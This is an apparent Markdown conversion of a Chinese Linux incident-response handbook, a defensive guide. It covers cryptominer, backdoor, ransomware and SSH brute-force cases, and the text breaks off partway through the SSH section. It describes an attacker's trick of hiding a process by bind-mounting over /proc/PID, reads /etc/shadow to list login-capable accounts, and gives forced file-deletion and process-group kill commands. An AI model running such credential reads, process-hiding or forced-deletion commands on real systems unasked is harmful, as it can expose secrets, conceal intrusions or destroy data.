# Linux 应急响应手册（整理版）

> 来源：`https://books.noptrace.com/linux/`
> 说明：根据站点 `search/search_index.json` 公开索引整理；内容已转换为 Markdown，便于检索和对比。

## 目录

1. [封面](https://books.noptrace.com/linux/0.%E5%B0%81%E9%9D%A2/)
2. [简介](https://books.noptrace.com/linux/1.%E7%AE%80%E4%BB%8B/)
3. [更新日记](https://books.noptrace.com/linux/2.%E6%9B%B4%E6%96%B0%E6%97%A5%E8%AE%B0/)
4. [处置前准备](https://books.noptrace.com/linux/3.%E5%A4%84%E7%BD%AE%E5%89%8D%E5%87%86%E5%A4%87/)
5. [注意事项](https://books.noptrace.com/linux/4.%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/)
6. [挖矿病毒](https://books.noptrace.com/linux/5.%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/)
7. [远控后门](https://books.noptrace.com/linux/6.%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8/)
8. [勒索病毒](https://books.noptrace.com/linux/7.%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/)
9. [暴力破解](https://books.noptrace.com/linux/8.%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/)
10. [非持续性事件](https://books.noptrace.com/linux/9.%E9%9D%9E%E6%8C%81%E7%BB%AD%E6%80%A7%E4%BA%8B%E4%BB%B6/)
11. [恶意软件包供应链攻](https://books.noptrace.com/linux/10.%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8C%85%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB/)
12. [隧道](https://books.noptrace.com/linux/11.%E9%9A%A7%E9%81%93/)
13. [常规安全检查](https://books.noptrace.com/linux/12.%E5%B8%B8%E8%A7%84%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5/)
14. [善后阶段](https://books.noptrace.com/linux/13.%E5%96%84%E5%90%8E%E9%98%B6%E6%AE%B5/)
15. [常见问题的解决方法](https://books.noptrace.com/linux/14.%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/)
16. [小技巧](https://books.noptrace.com/linux/15.%E5%B0%8F%E6%8A%80%E5%B7%A7/)
17. [知识点附录](https://books.noptrace.com/linux/16.%E7%9F%A5%E8%AF%86%E7%82%B9%E9%99%84%E5%BD%95/)

## 1. 封面

> 原文：https://books.noptrace.com/linux/0.%E5%B0%81%E9%9D%A2/

## 2. 简介

> 原文：https://books.noptrace.com/linux/1.%E7%AE%80%E4%BB%8B/

大家好，我们是 NOP Team, 《Linux 应急响应手册》新版终于和大家见面啦！

这是一本 `Linux` 应急响应参考书籍，自 2020 年 5 月 3 日开始编写，并于 2021 年 5 月 13 日在 NOP Team 公众号上发布第一版，内容主要包括 `Linux` 中常见应急响应事件的解决方案、应对几十种常见权限维持手段的常规安全检查方法、应急响应过程中的知识点以及小技巧等

`Linux` 服务器操作系统基本上都是命令行的环境，不像 `Windows` 可以使用很多操作性很强，使用起来很方便的图形化工具，同时，在很多场景下，我们没有办法使用自己的电脑通过 `SSH` 等方式直接连接到服务器进行操作，而是通过物理上机或者物理上堡垒机等方式进行操作，很多时候甚至是不允许携带电脑的，希望大家遇到这种场景的时候，手里的这份《Linux 应急响应手册》能帮到你

在当前的攻防对抗态势中，防守一侧的情况就和木桶效应一样，尤其是在已经被攻破的系统中，排查持久化控制程序如同大海捞针，这本应急响应手册的意义是希望能够有效发现木桶的短板，给予应急响应人员一个较为明确的指导思想，同时给出经过实践测试的操作方法，保证受害系统经过了一次相对全面的排查，以避免由于应急响应人员知识广度和能力水平问题而造成的二次木桶效应

《Linux 应急响应手册v1.9》版本开始，更换了新的封面，本书的新封面是我和多位设计师不断讨论了近一个月后的最终方案，主要是想致敬我的大学 —— 哈尔滨理工大学，那里有一群热爱网络安全的老师和同学们，他们曾给我很多帮助； 还要致敬我的家乡 —— 黑龙江，北国好风光，尽在黑龙江，欢迎大家去玩～

最后欢迎大家关注我们的公众号，也欢迎大家加我微信进行交流反馈： `just_hack_for_fun`

## 3. 更新日记

> 原文：https://books.noptrace.com/linux/2.%E6%9B%B4%E6%96%B0%E6%97%A5%E8%AE%B0/

v2.0.2 - 2025.3.5

 - 修复了 Markdown 引用样式部分导出后搜索乱码问题

 v2.0.1 - 2025.2.28

 - 添加了目录
 - 去除了部分标题末尾空格

 v2.0 - 2025.2.27

 - 各应急场景增加了流程图
 - 完善了应急场景的处置流程，添加了确认攻击信息准确性
 - 完善了应急场景的处置流程，添加了询问历史被攻击情况以及历史通报情况
 - 常规安全检查章节添加了 TCP Wrappers 后门排查
 - 常规安全检查章节添加了敏感目录排查
 - 常规安全检查章节添加了 udev 后门排查
 - 常规安全检查章节添加了 Python .pth 文件后门排查
 - 常规安全检查章节完善了 profile 配置检查
 - 常规安全检查章节完善了计划任务排查中 at 和 batch 的排查
 - 小技巧 -> 查找特定时间段内的文件章节添加查找某段时间内创建的文件
 - 完善处置前准备章节，增加了国产操作系统和《Windows 应急响应手册》的准备
 - 完善了 pstree 命令查看指定 pid 的进程的线程信息
 - 修复了小技巧章节 find 命令错误
 - 修复了挖矿病毒章节 ps 命令错误
 - 修复了由 sudo 本身引起的杀死进程组命令在 sudo 下失效的问题
 - 修复了暴力破解 -> SSH 暴力破解章节文字错误
 - 修复了数据恢复部分文字错误
 - 修复了勒索病毒 -> 根据勒索病毒类型寻找解决方法中的文字错误
 - 删除了安芯网盾沙箱
 - 删除了绿盟威胁分析中心网址
 - 删除了 WEBDIR+ 、Webshellkiller 工具的失效链接

 v1.9 - 2024.8.1

v1.8 - 2023.8.11

v1.7 - 2023.4.27

v1.6 - 2023.1.6

v1.5 - 2022.9.29

v1.4 - 2022.4.29

v1.3 - 2021.11.24

v1.2 - 2021.9.10

v1.1 - 2021.7.1

v1.0 - 2021.5.13

hello world - 2020.5.3

## 4. 处置前准备

> 原文：https://books.noptrace.com/linux/3.%E5%A4%84%E7%BD%AE%E5%89%8D%E5%87%86%E5%A4%87/

- 物理写保护优盘

 - 数据专用优盘

 - busybox

busybox 是一个集成工具，将Linux的部分工具进行了整合，节省了很多代码，有部分工具的参数可能会比系统自带的少一些

 - 各种查杀工具

 - 纯净的Ubuntu、Centos、Debian虚拟机，建议额外携带国产操作系统的虚拟机，例如 UOS

 - Linux 克隆取证启动U盘

 - 克隆取证数据存储硬盘

 - 本手册 ^_^

 - 顺便可以带上 《Windows 应急响应手册》

## 5. 注意事项

> 原文：https://books.noptrace.com/linux/4.%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/

### 0x01 删除文件问题

默认情况下，`rm ./*` 是不会删除以 `.` 开头的文件和文件夹的

所以在删除恶意文件等场景时，需要注意删除方法

## 6. 挖矿病毒

> 原文：https://books.noptrace.com/linux/5.%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/

### 0x00 整体流程

### 0x01 梳理现场情况

### 0x02 获取异常进程pid

- CPU占用
 - `top -c -o %CPU`
 - -c 参数显示进程的命令行参数
 - -p 参数指定进程的pid

 - `ps -w -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5`
 - 以 cpu 占用情况排序的进程信息前 5 行

 - 内存占用

 - `top -c -o %MEM`
 - -c 参数显示进程的命令行参数
 - -p 参数指定进程的pid

 - `ps -w -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head -n 5`

 - 网络占用      > 网络占用需要安装这两个软件，之后使用root权限进行执行     > Debian/Ubuntu      >     > - `apt-get install nethogs`     >     > Centos/RHEL      > - `yum -y install epel-release`     > - `yum -y install nethogs`

 - nethogs
 - jnettop

### 0x03 寻找恶意文件样本

经过以上步骤，我们基本上已经获取到进程pid或进程相关的命令行命令

 - 根据进程名字或者部分字符串获取pid

 `pidof "name"
ps -w -aux | grep "name"
ps -w -ef | grep "name" | grep -v grep | awk '{print $2}'
pgrep -f "name"

```

 - 根据pid获取程序的详细信息

 `lsof -p pid
pwdx pid  # 获取该pid的进程启动的时候的目录,并不一定是恶意文件所在的路径，只是启动恶意文件的路径
systemctl status pid  # 获取这个进程的 status 信息
cat /proc/pid/maps
ls -al /proc/pid/exe

```
 有些时候无法通过ps，top等命令根据pid进行查询，可能是因为攻击者将/proc/pid/ 进行了隐藏，可以通过以下方式进行隐藏(ubuntu测试成功，centos测试失败)  - mkdir .hidden - mount -o bind .hidden /proc/PID 这种情况可以使用 `cat /proc/$$/mountinfo` 来查看挂载信息

 - 根据pid查看由进程起的线程

 - `ps -w H -T -p pid`
 - `ps -w -Lf pid`  其中SPID就是线程ID，而CMD栏则显示了线程名称
 - `top -H -p pid` -H 选项可以显示线程
 - htop (默认未安装)，可以较为全面的展示线程
 - `pstree -agplU` 推荐，非常全面展示进程与线程间的关系
 - 可以在后面直接加 pid 的值，例如 `pstree -agplU 709` ，查看指定 pid 的进程与线程的关系

### 0x04 确定程序运行时间

- 查看程序运行时间

 - `ps -w -eo pid,lstart,etime,cmd | grep <pid>`

表示 `1292` 这个进程是在 `2022`年`4`月`28`日`13:32:20` 被创建的，已经运行了`30分零2秒`，具体执行的命令行为 `/usr/sbin/sshd -D`

 - 与找到的恶意文件创建时间进行对比

 - `stat xxx.sh`

 - `ls -al xxx.sh`

 这个部分更多是为了验证发现的文件是否为当前程序的恶意文件，增加这个对比，可能会发现一些之前没有发现的蛛丝马迹

### 0x05 处理异常进程

- 恶意文件样本采样

 - scp
 - `scp -P 4588 remote@www.target.com:/usr/local/aaa /home/admin`
 - -P 指定SSH端口
 - 从远程服务器将aaa下载到本地的 /home/admin

 - finalshell、xshell等集成工具

 - python、php等程序起http服务
 - nc

 - 病毒在线分析

 - 微步云沙箱
 - Virustotal
 - virscan
 - 哈勃
 - jotti
 - scanvir
 - 魔盾
 - HYBRID
 - 奇安信情报沙箱
 - 大圣云沙箱检测系统
 - YOMI
 - 360沙箱云
 - 安恒云沙箱

 - 寻找病毒分析报告

 - 深信服EDR团队安全情报分析
 - 火绒安全最新资讯
 - 安全客
 - Freebuf
 - 微步在线 X 情报社区
 - 安天
 - ...

 - 进程查杀      > 有些进程会起子进程，可以使用如下命令查看

 - `ps -w ajfx`
 - `systemctl status`

 如果无子进程，直接使用  - `kill -9 pid` 这样会直接杀死指定进程，但是，由这个进程产生的子进程不会被杀死

如果进程起子进程，需要使用如下命令       - `kill -9 -pid`  这里pid前有个减号，表示杀掉这个进程组

 `> 需要注意的是， `kill -9 -PGID` 配合 `sudo` 使用时，需要将命令修改为以下格式
>
> ```bash
> sudo kill -9 -- -PGID
> ```
>
> 也可以使用 `pkill` 来完成
>
> ```bash
> sudo pkill -g PGID   # 进程组前没有横杠
> ```

```
 ​

进程组ID & 会话ID  平时我们关注的更多是PID和PPID，对于PGID，SID接触较少，简单介绍一下  使用 `ps -w ajfx` 可以看到具体的PPID、PID、PGID、SID 信息  程序运行起来后，会产生一个主进程，并且分配一个进程ID（pid），如果在运行期间起其他进程，那么这个其他进程就是子进程，同时分配相应的进程ID，并设置其PPID的值为父进程的pid 此时呢，父进程和所有生成的子进程会组合成一个进程组，并且分配一个进程组ID 那什么叫做会话ID，其实也很容易理解，我们通过ssh 链接到服务器，就会获取一个会话，分配一个会话ID，此时我们起的进程的会话ID都是一样的 所以，如果挖矿程序有调用子进程，那么就需要以进程组为单位杀死！

 - 守护进程(daemon)

挖矿病毒为了保障挖矿程序的运行，通常会为挖矿程序设置守护进程，杀死守护进程与杀死普通进程并无区别，更详细的内容已经总结到 Linux守护进程 | 应急响应 这篇文章

 - 线程查杀     > 很多木马病毒将恶意代码执行做到了线程级别，也就是说附到了现有正常业务的进程中，做一个线程,目前查杀一个进程中的线程风险比较大，极可能会把进程搞崩掉，需要与客户确认好再进行，杀死线程的方法和杀死进程一样，因为在Linux中线程的概念就是轻量级进程

 - 根据pid查看由进程起的线程
 - `ps -w -T -p pid`
 - `ps -w -aLf pid`  其中SPID就是线程ID，而CMD栏则显示了线程名称
 - `top -H -p pid` -H 选项可以显示线程
 - htop (默认未安装)，可以较为全面的展示线程
 - `pstree -agplU` 推荐，非常全面展示进程与线程间的关系
 - 可以在后面直接加 pid 的值，例如 `pstree -agplU 709` ，查看指定 pid 的进程与线程的关系

 - 查看全部的线程
 - `ps -w -eLFa`

### 0x06 删除恶意文件

通过进程pid以及/proc/ ,我们已经定位到了文件的具体位置，接下来就是删除恶意文件

 - 查看文件占用      `lsof eval.sh`     如果存在进程占用，那么占用进程也可能是恶意进程，需要按照之前的步骤进行查看

 - a 和 i 属性导致文件不可删除

 - a属性 文件只能增加内容，不能修改之前的文件，不能删除文件
 - i属性 内容不能改变，文件不能删除      可以使用 `chattr -a` 和 `chattr -i`

 具体可以参考 https://www.cnblogs.com/kzang/articles/2673790.html

 - 奇怪文件名导致文件不可删除      > 从windows向linux传输的文件或者攻击者恶意制造的文件，很多会有文件名乱码，无法直接通过乱码的文件名进行删除，可以使用inode来确定文件名，之后删除

 - 使用 inode 进行删除

 - 查看inode

 - `ls -li eval.sh` `john@john:~/temp$ ls -li evil.sh
12327526 -rw-r--r-- 1 john john 0 3月   7 10:21 evil.sh
john@john:~/temp$

```

 - 删除文件

 - `find ./* -inum 12327526 -delete`
 - `find ./ -inum 12327526 -exec rm {} \;`
 - `find ./* -inum 12327526 -exec rm -i {} \;` (会有一步确认是否删除)
 - `find ./* -inum 12327526 -exec rm -f {} \;`(不进行确认直接强制删除)
 - `find ./* -inum 12327526 |xargs rm -f`
 - `rm `find ./* -inum 12327526`` 参考文章 https://www.cnblogs.com/starry-skys/p/12970463.html https://www.cnblogs.com/tssc/p/7574432.html

 - 目录挂载导致无法删除

当目录中没有文件但是依旧无法删除的时候，显示 `Device or resource busy`

使用lsof 进行查看，又发现没有资源占用，此时要考虑可能目录存在挂载点

此时需要先将挂载取消，之后再删除该文件夹

查看挂载情况

 `sudo lsblk -a

```

取消挂载

 `sudo umount /dev/sdb1

```
 /dev/sdb1 是演示电脑的情况，需要按照实际情况更改

这样就成功删除了

### 0x07 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x08 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 确认攻击信息准确性

安全设备、人、上级/行业/监管单位的通报都不见得是准确的，做二次研判是必要的，能够帮我应急响应人员确定整体排查思路

### 询问历史被攻击情况、历史通报

历史攻击可能会留下攻击遗产，成为未来新一轮攻击事件的发起点，询问清楚历史被攻击、被通报情况，向当事人或负责人了解清楚事件性质、处理过程、处理结果，这可能会在完全理不清攻击路径的时候帮你一把

### 采集并确定 ioc 信息

- 从内网 dns 服务器、dns 防火墙、流量审计设备等设备获取

 - 根据`ioc`信息确定挖矿程序具体家族类型

 - Virustotal

 - 深信服威胁情报中心

 - 微步在线

 - venuseye

 - 安恒威胁情报中心

 - 360威胁情报中心

 - 绿盟威胁情报中心

 - AlienVault

 - RedQueen安全智能服务平台

 - IBM X-Force Exchange

 - ThreatMiner

 - 腾讯威胁情报中心

 - 安天威胁情报中心

## 7. 远控后门

> 原文：https://books.noptrace.com/linux/6.%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8/

### 0x00 整体流程

### 0x01 梳理现场情况

### 0x02 通过EDR获取事件，直接定位到文件

已经获取到具体文件以及路径，接下来我们需要找到具体进程  - 根据文件找pid

`lsof | grep evil.sh` `lsof /root/evil.sh`  需要指定路径，只指定字符无法直接查出来   `fuser /root/evil.sh` 这条命令需要在root权限下执行，不然会显示为空

### 0x03 通过态势感知获取事件，外连ip+端口

根据五元组进行查证就是比较常见的情况了 - 根据目的IP及端口查找 pid

`netstat -pantu | grep 114.114.114.114` `netstat -pantu | grep 65533` `lsof -i:65533`

 - 根据本机IP+端口查找pid

 `netstat -pantu | grep 65533` `lsof -i:65533`

根据五元组无法找到 pid 可能是因为控制程序使用了隐藏C&C的技术，需要有针对性地进行排查，具体排查方法见 知识点附录 -> 0x05 与C&C隐藏技术的对抗 章节

### 0x04 查找进程信息

- 查找进程相关文件

 `lsof -p 1234`  root权限下执行    `pwdx`

 - 根据pid获取程序的详细信息

 - `lsof -p pid`
 - `pwdx pid` 获取该pid的进程启动的时候的目录,并不一定是恶意文件所在的路径，只是启动恶意文件的路径
 - `systemctl status pid` 获取这个进程的status信息
 - `cat /proc/pid/maps`
 - `ls -al /proc/pid/exe` 有些时候无法通过ps，top等命令根据pid进行查询，可能是因为攻击者将/proc/pid/ 进行了隐藏，可以通过以下方式进行隐藏(ubuntu测试成功，centos测试失败)  - mkdir .hidden - mount -o bind .hidden /proc/PID 这种情况可以使用 `cat /proc/$$/mountinfo` 来查看挂载信息

 - 根据pid查看由进程起的线程

 - `ps -w H -T -p pid`
 - `ps -w -Lf pid`  其中SPID就是线程ID，而CMD栏则显示了线程名称
 - `top -H -p pid` -H 选项可以显示线程
 - htop (默认未安装)，可以较为全面的展示线程
 - `pstree -agplU` 推荐，非常全面展示进程与线程间的关系
 - 可以在后面直接加 pid 的值，例如 `pstree -agplU 709` ，查看指定 pid 的进程与线程的关系

### 0x05 确定程序运行时间

- 查看程序运行时间

 - `ps -w -eo pid,lstart,etime,cmd | grep <pid>`

表示 `1292` 这个进程是在 `2022`年`4`月`28`日`13:32:20` 被创建的，已经运行了`30分零2秒`，具体执行的命令行为 `/usr/sbin/sshd -D`

 - 与找到的恶意文件创建时间进行对比

 - `stat xxx.sh`

 - `ls -al xxx.sh`

 这个部分更多是为了验证发现的文件是否为当前程序的恶意文件，增加这个对比，可能会发现一些之前没有发现的蛛丝马迹

### 0x06 处理异常进程

- 恶意文件样本采样

 - scp

 - `scp -P 4588 remote@www.target.com:/usr/local/aaa /home/admin`
 - -P 指定SSH端口
 - 从远程服务器将aaa下载到本地的 /home/admin

 - finalshell、xshell等集成工具

 - python、php等程序起http服务

 - 病毒在线分析

 - 微步云沙箱
 - Virustotal
 - virscan
 - 哈勃
 - jotti
 - scanvir
 - 魔盾
 - HYBRID
 - 奇安信情报沙箱
 - 大圣云沙箱检测系统
 - YOMI
 - 360沙箱云
 - 安恒云沙箱

 - 寻找病毒分析报告

 - 深信服EDR团队安全情报分析
 - 火绒安全最新资讯
 - 安全客
 - Freebuf
 - 微步在线 X 情报社区
 - 安天
 - ...

 - 进程查杀      > 有些进程会起子进程，可以使用如下命令查看

 - `ps -w ajfx`
 - `systemctl status`

 如果无子进程，直接使用  - `kill -9 pid` 这样会直接杀死指定进程，但是，由这个进程产生的子进程不会被杀死

如果进程起子进程，需要使用一下命令       - `kill -9 -pid` 注意，这里pid前有个减号，表示杀掉这个进程组

 `> 需要注意的是， `kill -9 -PGID` 配合 `sudo` 使用时，需要将命令修改为以下格式
>
> ```bash
> sudo kill -9 -- -PGID
> ```
>
> 也可以使用 `pkill` 来完成
>
> ```bash
> sudo pkill -g PGID   # 进程组前没有横杠
> ```

```
 进程组ID & 会话ID  平时我们关注的更多是PID和PPID，对于PGID，SID接触较少，简单介绍一下  使用 `ps -w ajfx` 可以看到具体的PPID、PID、PGID、SID 信息  程序运行起来后，会产生一个主线程，并且分配一个进程ID（pid），如果在运行期间起其他进程，那么这个其他进程就是子进程，同时分配相应的进程ID，并设置其PPID的值为父进程的pid 此时呢，父进程和所有生成的子进程会组合成一个进程组，并且分配一个进程组ID 那什么叫做会话ID，其实也很容易理解，我们通过ssh 链接到服务器，就会获取一个会话，分配一个会话ID，此时我们起的进程的会话ID都是一样的 所以，如果挖矿程序有调用子进程，那么就需要以进程组为单位杀死！

 - 守护进程(daemon)

挖矿病毒为了保障挖矿程序的运行，通常会为挖矿程序设置守护进程，杀死守护进程与杀死普通进程并无区别，更详细的内容已经总结到 Linux守护进程 | 应急响应 这篇文章

 - 线程查杀     > 很多木马病毒将恶意代码执行做到了线程级别，也就是说附到了现有正常业务的进程中，做一个线程,目前无法单独查杀一个进程中的某个线程。

 - 根据pid查看由进程起的线程
 - `ps -w -T -p pid`
 - `ps -w -aLf pid`  其中SPID就是线程ID，而CMD栏则显示了线程名称
 - `top -H -p pid` -H 选项可以显示线程
 - htop (默认未安装)，可以较为全面的展示线程
 - `pstree -agplU` 推荐，非常全面展示进程与线程间的关系
 - 可以在后面直接加 pid 的值，例如 `pstree -agplU 709` ，查看指定 pid 的进程与线程的关系

 - 查看全部的线程
 - `ps -w -eLFa`

### 0x07 删除恶意文件

通过进程pid以及/proc/ ,我们已经发现了定位到了文件的具体位置，接下来就是删除恶意文件

 - 查看文件占用      `lsof eval.sh`     如果存在进程占用，那么占用进程也可能是恶意进程，需要按照之前的步骤进行查看

 - a 和 i 属性导致文件不可删除

 - a属性 文件只能增加内容，不能修改之前的文件，不能删除文件
 - i属性 内容不能改变，文件不能删除      可以使用 `chattr -a` 和 `chattr -i`

 具体可以参考 https://www.cnblogs.com/kzang/articles/2673790.html

 - 奇怪文件名导致文件不可删除      > 在windows向linux传输的文件或者攻击者恶意制造的文件，很多会有文件名乱码，无法直接通过乱码的文件名进行删除，可以使用inode来确定文件名，之后删除

 - 使用 inode 进行删除

 - 查看inode

 - `ls -li eval.sh` `john@john:~/temp$ ls -li evil.sh
12327526 -rw-r--r-- 1 john john 0 3月   7 10:21 evil.sh
john@john:~/temp$

```

 - 删除文件

 - `find ./* -inum 12327526 -delete`
 - `find ./ -inum 12327526 -exec rm {} \;`
 - `find ./* -inum 12327526 -exec rm -i {} \;` (会有一步确认是否删除)
 - `find ./* -inum 12327526 -exec rm -f {} \;`(不进行确认直接强制删除)
 - `find ./* -inum 12327526 |xargs rm -f`
 - `rm `find ./* -inum 12327526`` 参考文章 https://www.cnblogs.com/starry-skys/p/12970463.html https://www.cnblogs.com/tssc/p/7574432.html

 ​

 - 目录挂载导致无法删除

当目录中没有文件但是依旧无法删除的时候，显示 `Device or resource busy`

使用lsof 进行查看，又发现没有资源占用，此时要考虑可能目录存在挂载点

此时需要先将挂载取消，之后再删除该文件夹

查看挂载情况

 `sudo lsblk -a

```

取消挂载

 `sudo umount /dev/sdb1

```
 /dev/sdb1 是演示电脑的情况，需要按照实际情况更改

这样就成功删除了

### 0x08 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x09 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 确认攻击信息准确性

安全设备、人、上级/行业/监管单位的通报都不见得是准确的，做二次研判是必要的，能够帮我应急响应人员确定整体排查思路

### 询问历史被攻击情况或历史通报

历史攻击可能会留下攻击遗产，成为未来新一轮攻击事件的发起点，询问清楚历史被攻击、被通报情况，向当事人或负责人了解清楚事件性质、处理过程、处理结果，这可能会在完全理不清攻击路径的时候帮你一把

### 采集并确定 ioc 信息

- 从内网 dns 服务器、dns 防火墙、流量审计设备等设备获取

 - 从 EDR、态势感知等设备获取

 - 根据`ioc`信息确定远控后门具体家族类型

 - Virustotal

 - 深信服威胁情报中心

 - 微步在线

 - venuseye

 - 安恒威胁情报中心

 - 360威胁情报中心

 - 绿盟威胁情报中心

 - AlienVault

 - RedQueen安全智能服务平台

 - IBM X-Force Exchange

 - ThreatMiner

 - 腾讯威胁情报中心

 - 安天威胁情报中心

## 8. 勒索病毒

> 原文：https://books.noptrace.com/linux/7.%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/

### 0x00 整体流程

### 0x01 勒索病毒简述

勒索病毒是让人比较无奈的恶意程序，大部分都是只有攻击者才能解密

近期和一些勒索解密团队合作后发现，其实还是有解密的可能的，是否能够解密，如何判断需要专业团队来完成

但还是那句话，把应急解密或者赎金的钱用在数据备份，安全防护上才是较为明智的选择

### 0x02 梳理现场情况

### 0x03 确定勒索病毒家族

判断勒索病毒家族并不难，可以从以下几个方面获取

 - 根据已获取的 ioc 信息去威胁情报平台查询
 - 勒索页面主动说明的，直接粘贴到baidu、google里面搜索
 - 勒索加密文件的后缀名
 - 联系邮箱

### 0x04 根据勒索病毒类型寻找解决方法

- 深信服EDR
 - 360安全卫士-勒索病毒解密
 - The No More Ransom Project
 - 腾讯电脑管家-勒索病毒搜索引擎
 - VenusEye勒索病毒搜索引擎
 - 奇安信-勒索病毒搜索引擎
 - 腾讯哈勃勒索病毒安全工具
 - 瑞星防勒索病毒专题
 - 卡巴斯基勒索软件解密器
 - ID Ransomware
 - Github
 - 淘宝、闲鱼
 - ...

### 0x05 寻找加密器

如果没有找到现成的解决办法，又不想冒险交赎金来解密的话，就只能通过找加密器和加密命令来分析解密方法了

寻找加密器并不简单，时间线是一个很重要的线索，其次是勒索病毒一般不会加密自己的加密器

### 0x06 解决勒索

如果通过公开途径或者交赎金的方式获取到了解密工具，一定要先测试好，免得遇到二次加密

如果是安全人员逆向分析，找到了破解方法，也建议对已经被加密的文件备份一份，免得解密过程中出现bug导致文件丢失

除了恢复被勒索系统以外，找到被勒索的原因是最重要的，如果由于缺少流量、日志等记录，无法还原，至少要做到以下几点

 - 将应用程序及系统升级、打上最新的安全补丁
 - 对于本次受到影响的系统进行重点备份

### 0x07 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x08 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 1. 确定加密时间

使用 find、locate 等程序，搜索被加密后的文件的后缀，对加密后的文件进行时间排序，很容易确定加密开始的时间，例如以下命令

 `find /path/to/search -type f -name "*.encrypted" -exec stat --format '%n %z' {} \; | sort -k2 | head -n 1

```
 我们以 `.so` 文件为例

这里需要注意，部分加密程序可能会对部分空文件或者特殊格式的文件仅重命名，所以需要人工鉴别来确定时间

### 2. 查找加密开始前的活动

- 通过 find 等来查看加密开始前创建文件的情况

 - 通过各种日志文件来查看加密开始前是否存在异常日志，包括 Web 等应用日志

### 3. 对加密器逆向分析

这部分需要具备逆向分析的能力，如果公司内部安全人员不具备，建议向专业的逆向分析人员求助

如果是单文件加密器，没有额外参数，分析起来可能比较容易

如果是单文件加密器有额外参数或者多文件加密器（证书或者公钥文件），则需要获取相关参数或文件才能进行分析，这种也是比较主流的

如果能获取到恶意程序原程序，也就是说执行该程序会从网络下载加密器并执行或者该恶意程序会自己释放加密器并执行，可以在隔离的测试环境，通过火绒剑等对恶意程序的执行过程进行监控，获取有效的加密器以及启动参数，进一步进行分析

### 保护现场

保护现场很重要，即使重装系统也建议保留一份镜像，尤其是与本次攻击相关的关键系统

可以使用电子取证专用的一些采集器

### 确认攻击信息准确性

安全设备、人、上级/行业/监管单位的通报都不见得是准确的，做二次研判是必要的，能够帮我应急响应人员确定整体排查思路

### 询问历史被攻击情况或历史通报

历史攻击可能会留下攻击遗产，成为未来新一轮攻击事件的发起点，询问清楚历史被攻击、被通报情况，向当事人或负责人了解清楚事件性质、处理过程、处理结果，这可能会在完全理不清攻击路径的时候帮你一把

### 采集并确定 ioc 信息

- 从内网 dns 服务器、dns 防火墙、流量审计设备等设备获取

 - 从EDR、态势感知等设备获取

 - 从被勒索文件特征以及勒索信获取

## 9. 暴力破解

> 原文：https://books.noptrace.com/linux/8.%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/

### 0x00 整体流程

### 0x01 梳理现场情况

### 0x02 SSH 暴力破解

- 检查网络连接信息

netstat -pantu

 - Proto 协议类型

 - Recv-Q ：表示收到的数据已经在本地接收缓冲，但是还有多少没有被进程取走，如果接收队列Recv-Q一直处于阻塞状态，可能是遭受了拒绝服务 denial-of-service 攻击。

 - Send-Q：对方没有收到的数据或者说没有Ack的,还是本地缓冲区。如果发送队列Send-Q不能很快的清零，可能是有应用向外发送数据包过快，或者是对方接收数据包不够快。

 - Local Address： 本机地址，一般有以下几种模式

 - *:80    监听IPv4或IPv6的任意IP的80端口

 - :::80    监听IPv6和IPv4的任意IP的80端口

 - 0.0.0.0:80    监听任意IPv4地址的80端口

 - 127.0.0.1:80    监听本地的80端口，只能本地访问

 - ::1:80    监听本地IPv6的回环地址，只能本地访问
 - 192.168.1.1:80  监听IP地址 192.168.1.1 的80端口

 - Foreign Address：外部地址

 规则和 Local Address 规则一样

 - State 网络状态

 - LISTEN 侦听状态，等待对端连接

 - SYN_SENT 客户端发送建立连接的SYN请求后状态为 SYN_SENT
 - SYN_RECV 服务端发送SYN+ACK 后网络状态为 SYN_RECV
 - ESTABLISHED 已经建立起连接
 - FIN_WAIT1 主动端四次挥手主动发起的第一个包，也就是FIN包之后网络状态为 FIN_WAIT1
 - CLOSE_WAIT 被动端收到四次挥手的FIN包，发送ACK后处于CLOSE_WAIT
 - FIN_WAIT2 主动关闭端接到ACK后进入FIN_WAIT2，等待对端发下一个FIN
 - LAST_ACK 被动关闭端发送第二个FIN后进入 LAST_ACK 状态，等待最后一个ACK的到来
 - TIME_WAIT 主动端发送最后一个ACK，之后进入 TIME_WAIT状态，等待一段时间确保对端接收到了ACK
 - CLOSING 在TCP四次挥手期间，主动关闭端发送了FIN包后，没有收到对应的ACK包，却收到对方的FIN包，此时，进入CLOSING状态
 - CLOSED 被动关闭端在接受到ACK包后，就进入了closed的状态。连接结束
 - UNKNOWN 未知的Socket状态

 - PID/Program name

 这个就是进程ID和进程名字了

 参考文章：https://blog.csdn.net/m0_37556444/article/details/83000553

ssh遭到暴力破解时网络连接如下：

存在大量的 ESTABLISHED状态的连接

 - 查找特殊权限账号，默认root      `awk -F: '{if($3==0) print $1}' /etc/passwd`

 - 查找可以登录 ssh 的账号      `s=$( sudo cat /etc/shadow | grep '^[^:]*:[^\*!]' | awk -F: '{print $1}');for i in $s;do cat /etc/passwd | grep -v  "/bin/false\|/nologin"| grep $i;done | sort | uniq |awk -F: '{print $1}'`

 - 查看正在连接的ssh sessions

